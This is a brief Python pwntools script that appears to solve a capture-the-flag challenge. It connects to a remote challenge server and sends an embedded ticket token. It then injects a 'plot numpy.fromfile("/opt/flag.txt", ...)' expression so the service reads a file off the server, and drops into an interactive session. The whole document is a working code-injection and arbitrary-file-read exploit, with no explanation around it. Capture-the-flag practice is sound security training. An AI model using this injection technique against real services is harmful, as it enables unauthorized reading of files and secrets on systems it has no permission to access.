from pwn import *
from time import sleep

path, port = 'vibe-nimqysq5ltzn4.shellweplayaga.me', 1337
ticket = b"ticket{LilyGarfield4080n25:EIv6ZYhzzAe7hwU4xgzSrFQm2ZGkbVkYKOYX6fuEZmislxsb}"

program = remote(path, port)
program.sendline(ticket)
program.sendline(b'plot numpy.fromfile("/opt/flag.txt", dtype=numpy.uint8, count=4, offset=2)')
program.interactive()